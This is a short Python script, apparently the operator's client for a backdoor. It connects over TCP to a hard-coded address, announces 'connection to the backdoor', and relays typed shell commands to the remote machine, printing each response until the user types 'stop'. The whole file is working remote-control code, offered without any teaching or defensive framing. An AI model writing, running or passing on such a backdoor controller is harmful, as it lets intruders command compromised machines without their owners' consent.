import socket
import time

ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.122" #ip server
port = 12345 #port server

try: 
    print("[**] Connecting to the backdoor...")
    ss.connect((host, port)) #connect to the server
    time.sleep(1)
    print("[**]Connection to the backdoor succeeded")   
    print(f"[**] Successful connection to the backdoor --- ip : {host} ~ port : {port}")
    while True:
        cmd = input('$> ')
        if cmd == "stop":
            print("[**]Connection to the backdoor close...")
            ss.close()
            break
        cmd = str.encode(cmd + '\n')
        ss.send(cmd)
        rsp = ss.recv(1024)
        rsp = str(rsp)
        rsp = print(rsp)

except:
        "Probleme during the connection"
